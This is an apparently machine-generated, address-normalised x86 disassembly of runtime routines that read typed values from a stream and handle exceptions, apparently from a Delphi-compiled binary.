call sub_418084
pop ecx
test al al
jne r-xdata
call sub_40392c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038d8
sub_418294
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41830f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419c54
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403320
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418314
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_418084
pop ecx
test al al
jne r-xdata
call sub_40392c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038d8
sub_418338
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418559
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_4195e4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4195e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_418529
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_4184e7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_417f84
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417ffc
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_4180e4
pop ecx
push ebp
call sub_418294
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_4181f4
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_40395c
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417ffc
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_417ffc
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418560
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404eb8
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403320
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_414164
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417f48
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413fac
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417f48
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413fac
sub_4184ec
push ebp
call sub_418064
pop ecx
test al al
je r-xdata
call sub_4038d8
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403124
sub_418574
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4185e4
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_4185cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4185e4
mov eax [ ebp - 0x4 ]
call sub_417b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c78
retn
sub_4185e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a1c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418aec
mov eax [ ebp - 0x4 ]
call sub_418988
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403320
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_4186a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403320
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a1c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_418338
mov eax [ ebp - 0x4 ]
call sub_418988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186ad
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_4186b4
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4197c0
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41893c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_417d84
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_4186f8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4197c0
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41893c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417d84
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41873c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4197c0
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41893c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417d84
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41878c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4197c0
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41893c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417d84
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_4187d0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4197c0
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41785c
mov al [ eax + lookup_table_4187f7 ]
jmp [ eax * 4 + jump_table_418805 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417d84
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fe8
mov eax esi
call j_sub_4043c4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417d84
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_4188d0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4197c0
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417d84
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_417d84
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417d84
jmp r-xdata
jmp r-xdata
call sub_41785c
sub_41893c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_417d60
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_4188d0
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_4197c0
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417d84
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_418990
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_417d60
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4197c0
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_4188d0
mov [ edi ] eax
sub_4189cd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418ac1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403ef8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f90
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ac8
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403074
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40415c
sub_418aec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418cbc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4036f0#6
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4195e4
xor edx edx
push ebp
push j_sub_4036f0#7
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4041b8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404418
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403364
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410c40
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403364
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410c40
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_418e70
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417d70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417d70
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410d04
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_418ad0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cc3
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov edi ebx
jmp r-xdata
sub_418ccc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413afc
mov ebx eax
test ebx ebx
je r-xdata
call sub_41785c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410d78
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418d14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4172f0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413fac
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418d54
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_418da3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419ed8
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_411214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418daa
lea eax [ ebp - 0x10 ]
call sub_40ed7c
retn
sub_418db0
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_418e62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417d60
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4187d0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4172f0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413fac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4197c0
lea eax [ ebp - 0x4 ]
call sub_405598
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4112c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e69
lea eax [ ebp - 0x8 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_405598
retn
sub_418e70
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41916b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419172
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x24 ]
call sub_4045d8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f1c
retn
jmp [ eax * 4 + jump_table_418f00 ]
mov eax [ rw-data ]
call sub_417844
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d04
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417d60
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e20
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d78
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4187d0
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410bdc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186b4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411008
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_419620
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410f08
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4196dc
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410f34
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_419504
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417d60
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417d60
cmp al 0xd
jne r-xdata
push ebp
call sub_418d54
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41893c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41128c
jmp r-xdata
push ebp
call sub_418db0
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d04
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d78
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4187d0
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418ccc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4197c0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d78
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4187d0
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4197c0
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411254
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4197c0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d04
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_417e78
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411254
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4187d0
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418d14
pop ecx
jmp r-xdata
sub_419178
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f4c
jmp r-xdata
mov eax [ ebx ]
call sub_413c94
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4191d8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4194f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4195c0
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4194d1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419492
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
mov eax [ ebp - 0x1c ]
call sub_413868
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_419178
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40306c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4135b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_419437
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405cc8
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
